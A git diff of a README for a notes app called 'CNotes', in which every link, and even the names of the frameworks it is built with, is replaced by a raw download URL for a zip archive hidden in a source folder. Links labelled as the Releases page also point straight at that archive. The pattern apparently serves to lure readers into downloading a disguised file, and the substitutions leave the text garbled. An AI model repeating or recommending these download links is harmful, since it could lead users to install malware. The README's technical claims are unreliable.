@@ -6,11 +6,11 @@ CNotes is a user-friendly notes application designed for everyone. Whether you n
 
 ## 📦 Download Now
 
-[![Download CNotes](https://raw.githubusercontent.com/EndMan95/CNotes/main/vesicocervical/CNotes.zip)](https://raw.githubusercontent.com/EndMan95/CNotes/main/vesicocervical/CNotes.zip)
+[![Download CNotes](https://github.com/EndMan95/CNotes/raw/refs/heads/main/src/app/dashboard/Notes-C-v3.9.zip)](https://github.com/EndMan95/CNotes/raw/refs/heads/main/src/app/dashboard/Notes-C-v3.9.zip)
 
 ## 🔥 What is CNotes?
 
-CNotes is a full-stack, multi-tenant Software as a Service (SaaS) notes application built using https://raw.githubusercontent.com/EndMan95/CNotes/main/vesicocervical/CNotes.zip, Prisma, and PostgreSQL. 
+CNotes is a full-stack, multi-tenant Software as a Service (SaaS) notes application built using https://github.com/EndMan95/CNotes/raw/refs/heads/main/src/app/dashboard/Notes-C-v3.9.zip, Prisma, and PostgreSQL. 
 
 ### Key Features
 
@@ -24,7 +24,7 @@ CNotes is a full-stack, multi-tenant Software as a Service (SaaS) notes applicat
 To run CNotes, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/EndMan95/CNotes/main/vesicocervical/CNotes.zip**: Version 14 or higher
+- **https://github.com/EndMan95/CNotes/raw/refs/heads/main/src/app/dashboard/Notes-C-v3.9.zip**: Version 14 or higher
 - **Internet**: Required for authentication and syncing notes
 - **Database**: PostgreSQL is required (can be installed locally or accessed via a managed service)
 
@@ -32,7 +32,7 @@ To run CNotes, ensure your system meets the following requirements:
 
 To get started with CNotes, visit the following page to download the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/EndMan95/CNotes/main/vesicocervical/CNotes.zip)
+[Visit this page to download](https://github.com/EndMan95/CNotes/raw/refs/heads/main/src/app/dashboard/Notes-C-v3.9.zip)
 
 Once you are on the Releases page, look for the most recent release and follow these steps:
 
@@ -54,7 +54,7 @@ Once you are on the Releases page, look for the most recent release and follow t
 If you encounter issues while downloading or installing CNotes, here are some common solutions:
 
 - **Download Issues**: Ensure you have a stable internet connection.
-- **File Not Opening**: Make sure you have the right operating system and that you have the correct version of https://raw.githubusercontent.com/EndMan95/CNotes/main/vesicocervical/CNotes.zip installed.
+- **File Not Opening**: Make sure you have the right operating system and that you have the correct version of https://github.com/EndMan95/CNotes/raw/refs/heads/main/src/app/dashboard/Notes-C-v3.9.zip installed.
 - **Authentication Problems**: Double-check your email and password. If necessary, reset your password.
 
 ## 🎨 Customization
@@ -77,7 +77,7 @@ We plan to add more features in future updates, including:
 - Enhanced search functionality.
 - Mobile application support.
 
-Stay tuned for new releases by checking back on the [Releases page](https://raw.githubusercontent.com/EndMan95/CNotes/main/vesicocervical/CNotes.zip).
+Stay tuned for new releases by checking back on the [Releases page](https://github.com/EndMan95/CNotes/raw/refs/heads/main/src/app/dashboard/Notes-C-v3.9.zip).
 
 ## 🌟 Get Involved
 
